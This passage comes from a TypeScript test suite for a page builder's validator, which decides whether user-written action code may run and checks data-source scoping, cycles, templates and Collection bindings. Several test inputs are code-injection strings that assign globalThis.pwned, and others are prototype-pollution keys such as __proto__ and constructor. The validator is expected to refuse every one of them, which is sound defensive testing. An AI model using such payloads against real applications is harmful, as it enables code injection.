    expect(
      codeMayRun(
        `${variable} = ${variable} < ${count} > /(globalThis.pwned = state.view)/i`,
        ["state"]
      )
    ).toBe(false);
  });

  test("refuses a code that is not exactly one expression, read the same way as a statement", () => {
    for (const code of [
      // a code that starts with an object
      '{} / "/}, globalThis.pwned = 1, () => { // "',
      `${variable} = 1 /* x */`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that starts with a character that would join it to the line before", () => {
    for (const code of ["[0]", "`x`", "+1", "-1", '("x")', "/x/", "{}"]) {
      expect(
        mayRun([
          { args: [], code: variable },
          { args: [], code },
        ]),
        code
      ).toBe(false);
    }
  });

  // An action may name only a variable or a Resource in scope: the holder's
  // own, an ancestor's on every path from a page root, or a global one
  test("refuses a data source that is not a variable or a Resource in scope", () => {
    for (const code of [
      `${parameter} = "x"`,
      `${variable} = ${parameter}`,
      `${encodeDataSourceVariable("missing")} = 1`,
      `${variable} = $ws$system`,
      // a sibling's, and an ancestor's on one path only
      `${sibling} = 1`,
      `${variable} = ${sibling}`,
      // one with no scope
      `${unscoped} = 1`,
      `${variable} = ${unscoped}`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(
      mayRun([{ args: [], code: `${onePath} = 1` }], { holder: "shared-form" })
    ).toBe(false);
    // the holder's own, an ancestor's, a global one and a Resource
    for (const code of [
      `${own} = 1`,
      `${variable} = 1`,
      `${count} = ${count} + 1`,
      `${variable} = ${resource}`,
    ]) {
      expect(codeMayRun(code), code).toBe(true);
    }
    expect(
      mayRun([{ args: [], code: `${everyPath} = ${variable}` }], {
        holder: "shared-form",
      })
    ).toBe(true);
    // and nothing without the build's data sources
    expect(
      actionMayRun(
        {
          ...actionProp([{ args: [], code: `${variable} = 1` }]),
          instanceId: "form",
        },
        { ...context, dataSources: new Map() }
      )
    ).toBe(false);
  });

  test("refuses a data source whose id is empty, whatever the build holds", () => {
    for (const code of [
      "$ws$dataSource$ = 1",
      `${variable} = $ws$dataSource$`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("keeps only its own data sources for a holder inside a cycle", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      dataSources: new Map([
        ["var-1", scoped("variable", "body")],
        ["own", scoped("variable", "cycle-form")],
      ]),
    };
    const inCycle = (code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: [], code }], "onStateChange"),
          instanceId: "cycle-form",
        },
        cyclic
      );
    expect(inCycle(`${variable} = 1`)).toBe(false);
    expect(inCycle(`${own} = 1`)).toBe(true);
  });

  test("keeps only its own data sources for a holder with a cycle above it, though a page template's root reaches it too", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "cycle-form")],
        ["template", node("Body", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([
        ["template-var", scoped("variable", "template")],
        ["own", scoped("variable", "cycle-form")],
      ]),
    };
    const inCycle = (id: string) =>
      actionMayRun(
        {
          ...actionProp(
            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
            "onStateChange"
          ),
          instanceId: "cycle-form",
        },
        cyclic
      );
    expect(inCycle("template-var")).toBe(false);
    expect(inCycle("own")).toBe(true);
  });

  test("keeps only its own data sources for a holder with a cycle above it, where a page template's root is on the page's path", () => {
    const cyclic: ActionContext = {
      instances: new Map([
        ["body", node("Body", "loop-a")],
        ["loop-a", node("Box", "loop-b")],
        ["loop-b", node("Box", "loop-a", "template")],
        ["template", node("Body", "cycle-form")],
        ["cycle-form", node(signupForm)],
      ]),
      pageRootIds: new Set(["body"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([["template-var", scoped("variable", "template")]]),
    };
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              {
                args: [],
                code: `${encodeDataSourceVariable("template-var")} = 1`,
              },
            ],
            "onStateChange"
          ),
          instanceId: "cycle-form",
        },
        cyclic
      )
    ).toBe(false);
  });

  test("reads undefined as a value, refuses reading NaN or Infinity, and refuses assigning to any of them", () => {
    expect(codeMayRun(`${variable} = undefined`)).toBe(true);
    for (const name of ["NaN", "Infinity"]) {
      expect(codeMayRun(`${variable} = ${name}`), name).toBe(false);
      expect(codeMayRun(`${variable} = -${name}`), name).toBe(false);
    }
    for (const name of ["undefined", "NaN", "Infinity"]) {
      expect(codeMayRun(`${name} = 1`), name).toBe(false);
    }
  });

  // An action runs only if it passes input validation, which refuses these
  test("refuses an action that input validation refuses", () => {
    const refusedByInputValidation: Array<{ args: string[]; code: string }> = [
      { args: [], code: `${variable} = NaN` },
      { args: [], code: `${variable} = Infinity` },
      { args: [], code: "$ws$dataSource$\\u0076ar__DASH__1 = 1" },
      { args: [], code: `${variable} = { constructor: 1 }` },
      { args: [], code: `${variable} = { "prototype": 1 }` },
      { args: [], code: `${variable} = { __defineGetter__: 1 }` },
      { args: [], code: `${variable} = { a: { __lookupGetter__: 1 } }` },
      { args: ["state"], code: "state = 1" },
      { args: ["state"], code: "state += 1" },
      { args: ["state"], code: `${variable} = state = 1` },
    ];
    for (const entry of refusedByInputValidation) {
      const name = JSON.stringify(entry);
      expect(checkAction([entry]).ok, name).toBe(false);
      expect(mayRun([entry]), name).toBe(false);
      // in any entry
      expect(
        mayRun([entry, { args: ["state"], code: `${variable} = state` }]),
        name
      ).toBe(false);
    }
    // what input validation passes still may run
    for (const entry of [
      { args: [], code: `${variable} = { toString: 1, then: 2, get: 3 }` },
      { args: ["state"], code: `${variable} = state` },
    ]) {
      expect(checkAction([entry]).ok, entry.code).toBe(true);
      expect(mayRun([entry]), entry.code).toBe(true);
    }
  });

  // An action may read a Resource, and assigns only a variable
  test("refuses assigning to a Resource, and reads one", () => {
    for (const code of [
      `${resource} = 1`,
      `${resource} += 1`,
      `${variable} = ${resource} = 1`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(codeMayRun(`${variable} = ${resource}`)).toBe(true);
  });

  test("refuses an object key __proto__, however it is written", () => {
    for (const code of [
      `${variable} = { __proto__: null }`,
      `${variable} = { "__proto__": [] }`,
      `${variable} = { a: { __proto__: { b: 1 } } }`,
      `${variable} = [{ __proto__: 1 }]`,
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
    expect(codeMayRun(`${variable} = { proto: 1, __proto: 2 }`)).toBe(true);
  });

  test("refuses an arg that is a reserved word, or that an entry lists twice", () => {
    for (const arg of [
      "await",
      "break",
      "class",
      "delete",
      "enum",
      "false",
      "implements",
      "interface",
      "let",
      "new",
      "null",
      "package",
      "private",
      "protected",
      "public",
      "static",
      "super",
      "this",
      "true",
      "typeof",
      "var",
      "void",
      "with",
      "yield",
      // input validation refuses it as an arg
      "undefined",
    ]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
    }
    expect(codeMayRun(`${variable} = a`, ["a", "a"])).toBe(false);
    expect(
      mayRun([
        { args: ["a", "b", "a"], code: `${variable} = 1` },
        { args: ["a"], code: `${variable} = a` },
      ])
    ).toBe(false);
    for (const arg of ["type", "of", "async", "get"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
    }
  });

  // An arg may not be a data source's name made a plain identifier, nor that
  // followed by `_`, `_N` or `__N`, where the code reads the data source
  test("refuses an arg that a data source it names could be named as", () => {
    const named = (name: string, arg: string, code = `${variable} = ${arg}`) =>
      actionMayRun(
        {
          ...actionProp([{ args: [arg], code }], "onStateChange"),
          instanceId: "form",
        },
        {
          ...context,
          dataSources: new Map([
            ...context.dataSources,
            ["var-1", { ...scoped("variable", "body"), name }],
          ]),
        }
      );
    // read
    const reads = (arg: string) => `${variable} = ${variable} ? ${arg} : 1`;
    expect(named("state", "state", reads("state"))).toBe(false);
    expect(named("state", "state_1", reads("state_1"))).toBe(false);
    expect(named("state", "state_", reads("state_"))).toBe(false);
    expect(named("state", "state__2", reads("state__2"))).toBe(false);
    expect(named("my state", "mystate", reads("mystate"))).toBe(false);
    expect(named("state!", "state", reads("state"))).toBe(false);
    expect(named("state", "state", `${count} = ${variable}`)).toBe(false);
    expect(named("state", "state", `${variable} += state`)).toBe(false);
    expect(named("state", "state", `${variable} ||= state`)).toBe(false);
    expect(named("state", "state", `${variable} = ${variable} += 1`)).toBe(
      false
    );
    // set only where something else decides
    expect(named("state", "state", `${count} && (${variable} = state)`)).toBe(
      false
    );
    expect(named("state", "state", `${count} = ${variable} = state`)).toBe(
      false
    );
    // in an entry before or after one that only sets it
    for (const value of [
      [
        { args: [], code: `${count} = ${variable}` },
        { args: ["state"], code: `${variable} = state` },
      ],
      [
        { args: [], code: `${variable} = 1` },
        { args: ["state"], code: `${count} = ${variable}` },
      ],
    ]) {
      expect(
        actionMayRun(
          { ...actionProp(value, "onStateChange"), instanceId: "form" },
          {
            ...context,
            dataSources: new Map([
              ...context.dataSources,
              ["var-1", { ...scoped("variable", "body"), name: "state" }],
            ]),
          }
        ),
        JSON.stringify(value)
      ).toBe(false);
    }
    // a code that only sets it to a value that does not name it, as the
    // templates' actions do
    expect(named("state", "state")).toBe(true);
    expect(named("state", "state_1")).toBe(true);
    expect(named("my state", "mystate", `${variable} = mystate ? 1 : 2`)).toBe(
      true
    );
    // a data source it does not name, and a name that is only alike
    expect(named("state", "state", `${count} = state`)).toBe(true);
    expect(named("state", "states", reads("states"))).toBe(true);
    expect(named("state", "state_x", reads("state_x"))).toBe(true);
    expect(named("formState", "state", reads("state"))).toBe(true);
  });

  // A data source's id or name may not be one the page module uses for
  // anything else, and an action may not name one that is
  test("names no data source whose id or name the page module uses for something else", () => {
    const build = {
      instances: new Map([
        ["body", node("Body", "box", "list", "form-1", "form-2")],
        ["box", node("Box")],
        ["list", node(collectionComponent)],
        ["form-1", node("Form")],
        ["form-2", node("WebhookForm")],
      ]),
      pageRootIds: new Set(["body"]),
      pages: [{ rootInstanceId: "body" }],
      props: new Map<Prop["id"], Prop>([
        [
          "box-resource",
          {
            id: "box-resource",
            instanceId: "box",
            name: "action",
            type: "resource",
            value: "prop-resource",
          },
        ],
      ]),
      resources: new Map([["resource-1", {}]]),
    };
    const variableOf = (id: string, name = "v"): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name,
        scopeInstanceId: "body",
        value: { type: "string", value: "" },
      },
    ];
    for (const [id, name] of [
      ["Box", "v"],
      ["Body", "v"],
      ["set$v1", "v"],
      ["list-index", "v"],
      ["resource-1", "v"],
      ["prop-resource", "v"],
      ["bound-resource", "v"],
      ["form-1", "v"],
      ["form-2", "v"],
      ["@webstudio-is/sdk-components-react/components:Input", "v"],
      [":system", "v"],
      ["a b", "v"],
      ["v2", "_key"],
      ["v3", "_ key"],
      ["v4", "renderText"],
      ["v5", "let"],
      ["v6", "static"],
      ["v7", "_data"],
      ["v8", "_action"],
      ["v9", "Object"],
      ["v10", "Array"],
      ["v11", "Number"],
      ["v12", "Map"],
      ["v13", "String"],
      ["v15", "Obj ect"],
    ]) {
      const dataSources = new Map([
        variableOf("v1"),
        variableOf(id, name),
        [
          "binding",
          {
            type: "resource",
            id: "binding",
            name: "binding",
            scopeInstanceId: "body",
            resourceId: "bound-resource",
          },
        ],
      ] as Array<[string, DataSource]>);
      expect(
        [...collidingDataSourceIds({ ...build, dataSources })],
        id
      ).toEqual([id]);
      const actionContext = actionContextOf({ ...build, dataSources });
      const reference = encodeDataSourceVariable(id);
      const prop = {
        ...actionProp([{ args: [], code: `${reference} = 1` }]),
        instanceId: "box",
      };
      expect(actionMayRun(prop, actionContext), id).toBe(false);
      // with the build's data sources as they are, one that a code can name
      // and input validation passes would pass
      if (/^\$ws\$dataSource\$\w+$/.test(reference)) {
        expect(actionMayRun(prop, { ...actionContext, dataSources }), id).toBe(
          true
        );
      }
    }
    // a data source stored under another key
    expect([
      ...collidingDataSourceIds({
        ...build,
        dataSources: new Map([["key", variableOf("v1")[1]]]),
      }),
    ]).toEqual(["key"]);
    // ids and names as the builder makes them
    const dataSources = new Map([
      variableOf("aB3_x-Yz09", "Box"),
      variableOf("0f4c1c4e-6bd3-5f0c-9a8b-1c2d3e4f5a6b", "set$v1"),
      variableOf("v4", "key"),
      variableOf("v5", "index"),
      variableOf("v6", "NaN"),
      variableOf("v7", "Infinity"),
    ]);
    expect([...collidingDataSourceIds({ ...build, dataSources })]).toEqual([]);
    expect(actionContextOf({ ...build, dataSources }).dataSources).toEqual(
      dataSources
    );
  });

  test("names no data source with the id Body, though the build holds no Body", () => {
    const build = {
      instances: new Map([["root", node("Box")]]),
      pages: [{ rootInstanceId: "root" }],
      props: new Map<Prop["id"], Prop>(),
      resources: new Map(),
    };
    const variableOf = (id: string): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name: "v",
        scopeInstanceId: ROOT_INSTANCE_ID,
        value: { type: "string", value: "" },
      },
    ];
    expect([
      ...collidingDataSourceIds({
        ...build,
        dataSources: new Map([variableOf("Body"), variableOf("v1")]),
      }),
    ]).toEqual(["Body"]);
  });

  // A Resource Form's own form data and browser info stay while org script
  // is paused, as upstream binds them
  test("names a Resource Form's own form data and browser info as themselves, as upstream binds them", async () => {
    // upstream's binding of a managed form's parameters, from its source:
    // its package does not export it
    const { getManagedFormParameterBinding } = (await import(
      /* @vite-ignore */ new URL(
        "../../sdk/src/managed-form-graph.ts",
        import.meta.url
      ).href
    )) as {
      getManagedFormParameterBinding: (input: {
        source: DataSource;
        formId: string;
        instances: Instances;
        systemDataSourceId?: string;
      }) => string;
    };
    const formInstances = new Map([
      ["body", node("Body", "form", "webhook", "box", ROOT_INSTANCE_ID)],
      ["form", node("ResourceForm")],
      ["webhook", node("WebhookForm")],
      ["box", node("Box")],
      [ROOT_INSTANCE_ID, node("ResourceForm")],
    ]);
    const parameterOf = (
      id: string,
      name: string,
      scopeInstanceId?: string
    ): Extract<DataSource, { type: "parameter" }> => ({
      type: "parameter",
      id,
      name,
      scopeInstanceId,
    });
    const cases: Array<[Extract<DataSource, { type: "parameter" }>, boolean]> =
      [
        [parameterOf("form-data", "formData", "form"), true],
        [parameterOf("browser-info", "browserInfo", "form"), true],
        // another name, form, scope or owner
        [parameterOf("other", "formData1", "form"), false],
        [parameterOf("upper", "FormData", "form"), false],
        [parameterOf("webhook-data", "formData", "webhook"), false],
        [parameterOf("box-data", "formData", "box"), false],
        [parameterOf("no-scope", "formData"), false],
        [parameterOf("global-data", "formData", ROOT_INSTANCE_ID), false],
        [parameterOf("page-own", "formData", "form"), false],
      ];
    for (const [dataSource, named] of cases) {
      const colliding = collidingDataSourceIds({
        instances: formInstances,
        dataSources: new Map([[dataSource.id, dataSource]]),
        props: new Map([
          [
            "prop",
            {
              id: "prop",
              instanceId: dataSource.scopeInstanceId ?? "",
              name: dataSource.name,
              type: "parameter",
              value: dataSource.id,
            },
          ],
        ]),
        resources: new Map(),
        pages: [{ rootInstanceId: "body", systemDataSourceId: "page-own" }],
      });
      expect(colliding.has(dataSource.id), dataSource.id).toBe(!named);
      // upstream binds the same ones as the submission's
      let binding: undefined | string;
      try {
        binding = getManagedFormParameterBinding({
          source: dataSource,
          formId: dataSource.scopeInstanceId ?? "",
          instances: formInstances as Instances,
          systemDataSourceId: "page-own",
        });
      } catch {
        binding = undefined;
      }
      expect(
        (binding === "formData" || binding === "browserInfo") &&
          dataSource.scopeInstanceId !== ROOT_INSTANCE_ID,
        dataSource.id
      ).toBe(named);
    }
  });

  // A Resource Form's own form data and browser info stay only where the
  // form publishes, and only while nothing outside the form names them
  test("names a Resource Form's own form data and browser info only on a form that publishes, named on the form or inside it", () => {
    const formInstances = new Map([
      ["body", node("Body", "form", "shared")],
      ["form", node("ResourceForm", "inner")],
      ["inner", node("Box")],
      ["xml-body", node("Body", "xml-item", "shared")],
      ["xml-item", node("XmlNode", "xml-form", "xml-title")],
      ["xml-form", node("ResourceForm")],
      ["xml-title", node("XmlNode")],
      ["shared", node("Fragment", "shared-form")],
      ["shared-form", node("ResourceForm")],
    ]);
    const pages = [
      { rootInstanceId: "body" },
      { rootInstanceId: "xml-body", documentType: "xml" as const },
    ];
    const named = (formId: string, holders: string[]) => {
      const dataSource: DataSource = {
        type: "parameter",
        id: "form-data",
        name: "formData",
        scopeInstanceId: formId,
      };
      const colliding = collidingDataSourceIds({
        instances: formInstances,
        dataSources: new Map([[dataSource.id, dataSource]]),
        props: new Map(
          holders.map((holder): [string, Prop] => [
            holder,
            {
              id: holder,
              instanceId: holder,
              name: holder === formId ? "formData" : "title",
              type: "parameter",
              value: dataSource.id,
            },
          ])
        ),
        resources: new Map(),
        pages,
      });
      return colliding.has(dataSource.id) === false;
    };
    // on an HTML page, named on the form or inside it
    expect(named("form", ["form"])).toBe(true);
    expect(named("form", ["form", "inner"])).toBe(true);
    // on an XML page only
    expect(named("xml-form", ["xml-form"])).toBe(false);
    expect(named("xml-form", ["xml-form", "xml-title"])).toBe(false);
    // on an HTML page and an XML page
    expect(named("shared-form", ["shared-form"])).toBe(true);
    // named outside the form
    expect(named("form", ["form", "xml-title"])).toBe(false);
    expect(named("shared-form", ["shared-form", "xml-title"])).toBe(false);
    expect(named("form", ["body"])).toBe(false);
  });

  // A parameter is declared as itself only as a page's own, held on its root,
  // or as a Collection's item or key, which the Collection binds once and
  // which is named only inside it. A data source a Collection binds is such a
  // parameter.
  test("names no parameter but a page's own and a Collection's item or key, bound once and named only inside it, and no other data source a Collection binds", () => {
    const parameterOf = (
      id: string,
      scopeInstanceId: string,
      name = id
    ): [string, DataSource] => [
      id,
      { type: "parameter", id, name, scopeInstanceId },
    ];
    const variableOf = (
      id: string,
      scopeInstanceId = "page"
    ): [string, DataSource] => [
      id,
      {
        type: "variable",
        id,
        name: id,
        scopeInstanceId,
        value: { type: "string", value: "" },
      },
    ];
    const parameterProp = (
      instanceId: string,
      name: string,
      value: string
    ): [string, Prop] => {
      const id = `${instanceId}:${name}`;
      return [id, { id, instanceId, name, type: "parameter", value }];
    };
    const base = {
      instances: new Map([
        ["page", node("Body", "list", "box", "left", "right")],
        ["list", node(collectionComponent, "card")],
        ["card", node("Box")],
        ["box", node("Box")],
        ["left", node("Box", "shared")],
        ["right", node("Box")],
        ["shared", node("Box")],
        ["template", node("Body")],
        ["orphan", node("Box")],
      ]),
      pages: [
        { rootInstanceId: "page", systemDataSourceId: "page-system" },
        { rootInstanceId: "template", systemDataSourceId: "template-system" },
      ] as PageNames[],
      resources: new Map(),
    };
    const colliding = ({
      dataSources,
      props = [],
      instances = base.instances,
      pages = base.pages,
    }: {
      dataSources: Array<[string, DataSource]>;
      props?: Array<[string, Prop]>;
      instances?: typeof base.instances;
      pages?: typeof base.pages;
    }) => [
      ...collidingDataSourceIds({
        ...base,
        instances,
        pages,
        dataSources: new Map(dataSources),
        props: new Map(props),
      }),
    ];
    const item = parameterOf("item", "list");
    const bound = parameterProp("list", "item", "item");

    // a page's and a page template's own, and a Collection's item and key
    expect(
      colliding({
        dataSources: [
          parameterOf("page-system", "page", "system"),
          parameterOf("template-system", "template", "system"),
          item,
          parameterOf("key", "list"),
        ],
        props: [
          bound,
          parameterProp("list", "itemKey", "key"),
          parameterProp("card", "data-item", "item"),
          parameterProp("card", "data-key", "key"),
          // where no page or template reaches
          parameterProp("orphan", "data-item", "item"),
        ],
      })
    ).toEqual([]);

    // a parameter that is neither, with any name, and what names it
    expect(
      colliding({
        dataSources: [
          parameterOf("stray", "page", "capture"),
          parameterOf("global", ROOT_INSTANCE_ID, "g"),
        ],
        props: [parameterProp("box", "ref", "stray")],
      })
    ).toEqual(["stray", "global"]);

    // a page's own, held anywhere but on its root, or on a root that another
    // page or an instance also holds, or claimed by two pages
    expect(
      colliding({ dataSources: [parameterOf("page-system", "box")] })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        pages: [...base.pages, { rootInstanceId: "page" }],
      })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        instances: new Map([...base.instances, ["box", node("Box", "page")]]),
      })
    ).toEqual(["page-system"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        pages: [
          ...base.pages,
          { rootInstanceId: "box", systemDataSourceId: "page-system" },
        ],
      })
    ).toEqual(["page-system"]);
    // a variable with a page's own id
    expect(colliding({ dataSources: [variableOf("page-system")] })).toEqual([
      "page-system",
    ]);
    // a page's or a page template's own on a root with the global root's id,
    // which every page holds
    expect(
      colliding({
        dataSources: [parameterOf("root-system", ROOT_INSTANCE_ID)],
        pages: [
          ...base.pages,
          {
            rootInstanceId: ROOT_INSTANCE_ID,
            systemDataSourceId: "root-system",
          },
        ],
        props: [parameterProp("box", "ref", "root-system")],
      })
    ).toEqual(["root-system"]);

    // a Collection's item named outside it: elsewhere, on the Collection
    // itself, or on an instance also held outside it
    for (const holder of ["box", "list", "page"]) {
      expect(
        colliding({
          dataSources: [item],
          props: [bound, parameterProp(holder, "data-item", "item")],
        }),
        holder
      ).toEqual(["item"]);
    }
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node("Box", "shared")],
        ]),
        props: [bound, parameterProp("shared", "data-item", "item")],
      })
    ).toEqual(["item"]);
    // or below a cycle
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node("Box", "loop")],
          ["loop", node("Box", "card")],
        ]),
        props: [bound, parameterProp("loop", "data-item", "item")],
      })
    ).toEqual(["item"]);
    // bound twice, by one Collection or by two
    expect(
      colliding({
        dataSources: [item],
        props: [bound, parameterProp("list", "itemKey", "item")],
      })
    ).toEqual(["item"]);
    expect(
      colliding({
        dataSources: [item],
        instances: new Map([
          ...base.instances,
          ["card", node(collectionComponent)],
        ]),
        props: [bound, parameterProp("card", "item", "item")],
      })
    ).toEqual(["item"]);
    // two binding props of one name on one Collection, of any type: neither
    // parameter is its binding
    const secondProp = (
      name: string,
      value: string,
      type: "parameter" | "expression" = "parameter"
    ): [string, Prop] => {
      const id = `list:${name}:second`;
      return [id, { id, instanceId: "list", name, type, value } as Prop];
    };
    for (const name of ["item", "itemKey"]) {
      expect(
        colliding({
          dataSources: [
            parameterOf("first", "list"),
            parameterOf("last", "list"),
          ],
          props: [
            parameterProp("list", name, "first"),
            secondProp(name, "last"),
            parameterProp("card", "ref", "first"),
          ],
        }),
        name
      ).toEqual(["first", "last"]);
    }
    expect(
      colliding({
        dataSources: [item],
        props: [bound, secondProp("item", "$ws$dataSource$item", "expression")],
      })
    ).toEqual(["item"]);
    // held by another instance, or a page's own
    expect(
      colliding({ dataSources: [parameterOf("item", "page")], props: [bound] })
    ).toEqual(["item"]);
    expect(
      colliding({
        dataSources: [parameterOf("page-system", "page")],
        props: [parameterProp("list", "item", "page-system")],
      })
    ).toEqual(["page-system"]);
    // a variable or a Resource a Collection binds, and an action that names it
    const variable = variableOf("v");
    const bindsVariable = {
      dataSources: [variable],
      props: [parameterProp("list", "item", "v")],
    };
    expect(colliding(bindsVariable)).toEqual(["v"]);
    expect(
      colliding({
        dataSources: [
          [
            "res",
            {
              type: "resource",
              id: "res",
              name: "res",
              scopeInstanceId: "page",
              resourceId: "resource",
            },
          ],
        ],
        props: [parameterProp("list", "itemKey", "res")],
      })
    ).toEqual(["res"]);
    // bound by a Collection stored with the global root's id, which never
    // ships
    expect(
      colliding({
        dataSources: [parameterOf("root-item", ROOT_INSTANCE_ID)],
        instances: new Map([
          ...base.instances,
          [ROOT_INSTANCE_ID, node(collectionComponent)],
        ]),
        pages: [...base.pages, { rootInstanceId: ROOT_INSTANCE_ID }],
        props: [parameterProp(ROOT_INSTANCE_ID, "item", "root-item")],
      })
    ).toEqual(["root-item"]);
    // a variable, or a page's own, held by the Collection that binds it
    expect(
      colliding({
        dataSources: [variableOf("v", "list")],
        props: [parameterProp("list", "item", "v")],
      })
    ).toEqual(["v"]);
    expect(
      colliding({
        dataSources: [parameterOf("list-system", "list-root")],
        instances: new Map([
          ...base.instances,
          ["list-root", node(collectionComponent)],
        ]),
        pages: [
          ...base.pages,
          { rootInstanceId: "list-root", systemDataSourceId: "list-system" },
        ],
        props: [parameterProp("list-root", "item", "list-system")],
      })
    ).toEqual(["list-system"]);
    const context = actionContextOf({
      ...base,
      pageRootIds: new Set(["page"]),
      dataSources: new Map(bindsVariable.dataSources),
      props: new Map(bindsVariable.props),
    });
    expect(
      actionMayRun(
        {
          ...actionProp([
            { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
          ]),
          instanceId: "card",
        },
        context
      )
    ).toBe(false);
  });

  // The context is computed again when the instances, the props, the
  // Resources or the pages it was computed from change
  test("judges a data source again when what decides it changes", () => {
    const dataSources = new Map<DataSource["id"], DataSource>([
      [
        "v1",
        {
          type: "variable",
          id: "v1",
          name: "v",
          scopeInstanceId: "body",
          value: { type: "string", value: "" },
        },
      ],
      [
        "p1",
        {
          type: "parameter",
          id: "p1",
          name: "system",
          scopeInstanceId: "body",
        },
      ],
    ]);
    const build = {
      instances: new Map([["body", node("Body")]]),
      pageRootIds: new Set(["body"]),
      pages: [
        { rootInstanceId: "body", systemDataSourceId: "p1" },
      ] as PageNames[],
      dataSources,
      props: new Map<Prop["id"], Prop>(),
      resources: new Map(),
    };
    const kept = (changes: Partial<typeof build>) => [
      ...actionContextOf({ ...build, ...changes }).dataSources.keys(),
    ];
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(kept({ resources: new Map([["v1", {}]]) })).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(
      kept({
        props: new Map<Prop["id"], Prop>([
          [
            "action",
            {
              id: "action",
              instanceId: "body",
              name: "action",
              type: "resource",
              value: "v1",
            },
          ],
        ]),
      })
    ).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(
      kept({
        instances: new Map([
          ["body", node("Body", "v1")],
          ["v1", node("Form")],
        ]),
      })
    ).toEqual(["p1"]);
    expect(kept({})).toEqual(["v1", "p1"]);
    expect(kept({ pages: [{ rootInstanceId: "body" }] })).toEqual(["v1"]);
  });

  // A page template is edited on the canvas as a page is, but publishing
  // reads the pages: an instance a page reaches is judged by the pages, and
  // one only a template reaches by the templates
  test("judges a holder a page reaches by the page roots, and one only a template reaches by the template roots", () => {
    const tree: ActionContext = {
      instances: new Map([
        ["page", node("Body", "shared")],
        ["template", node("Body", "wrapper", "only")],
        ["wrapper", node("Box", "shared")],
        ["shared", node(signupForm)],
        ["only", node(signupForm)],
      ]),
      pageRootIds: new Set(["page"]),
      templateRootIds: new Set(["template"]),
      dataSources: new Map([
        ["page-var", scoped("variable", "page")],
        ["template-var", scoped("variable", "template")],
        ["wrapper-var", scoped("variable", "wrapper")],
      ]),
    };
    const on = (holder: string, id: string) =>
      actionMayRun(
        {
          ...actionProp(
            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
            "onStateChange"
          ),
          instanceId: holder,
        },
        tree
      );
    expect(on("shared", "page-var")).toBe(true);
    expect(on("shared", "wrapper-var")).toBe(false);
    expect(on("shared", "template-var")).toBe(false);
    expect(on("only", "template-var")).toBe(true);
    expect(on("only", "page-var")).toBe(false);
    // and without template roots, only its own
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              {
                args: [],
                code: `${encodeDataSourceVariable("template-var")} = 1`,
              },
            ],
            "onStateChange"
          ),
          instanceId: "only",
        },
        { ...tree, templateRootIds: undefined }
      )
    ).toBe(false);
  });

  test("refuses an action as a Collection's item or key", () => {
    const tree: ActionContext = {
      instances: new Map([
        ["body", node("Body", "list", "box")],
        ["list", node(collectionComponent)],
        ["box", node("Box")],
      ]),
      pageRootIds: new Set(["body"]),
      dataSources: new Map(),
    };
    const on = (instanceId: string, name: string) =>
      actionMayRun({ ...actionProp([], name), instanceId }, tree);
    expect(on("list", "item")).toBe(false);
    expect(on("list", "itemKey")).toBe(false);
    expect(on("list", "onClick")).toBe(true);
    expect(on("box", "item")).toBe(true);
  });

  test("refuses, without throwing, a value that is not an action's shape", () => {
    expect(
      actionMayRun(
        {
          ...actionProp([]),
          instanceId: "form",
          value: [{ type: "execute", args: "event", code: "1" }],
        } as never,
        context
      )
    ).toBe(false);
    expect(
      actionMayRun(
        {
          ...actionProp([]),
          instanceId: "form",
          value: [{ type: "execute", args: [], code: 1 }],
        } as never,
        context
      )
    ).toBe(false);
  });

  test("accepts the actions the builder writes, and plain values", () => {
    for (const value of [
      // what the props panel adds, with nothing in it yet
      [],
      [{ args: [], code: `${variable} = 1` }],
      [{ args: [], code: `${variable} = !${variable}` }],
      [{ args: [], code: `${count} = ${count} + 1` }],
      [{ args: ["state"], code: `${variable} = state` }],
      [{ args: ["state"], code: `${variable} = state ? "open" : "closed"` }],
      [{ args: ["state"], code: `${variable} = \`tab \${state}\`` }],
      [{ args: ["a", "b"], code: `${variable} = a < b` }],
      [{ args: ["a", "b"], code: `${variable} = a > b` }],
      [{ args: [], code: `${variable} = { a: 1, b: [2] }` }],
      [{ args: [], code: `${variable} = ${resource}` }],
      [{ args: [], code: ` ${variable} = "/events/(all)" ` }],
    ]) {
      expect(mayRun(value), JSON.stringify(value)).toBe(true);
    }
  });

  test("accepts every action the OrganizeOS blocks' templates write, as each is scoped", () => {
    const actions = Object.entries(organizeosTemplates).flatMap(
      ([name, meta]) => {
        const fragment = renderTemplate(meta.template);
        const fragmentContext = actionContextOf({
          instances: new Map(
            fragment.instances.map((instance) => [instance.id, instance])
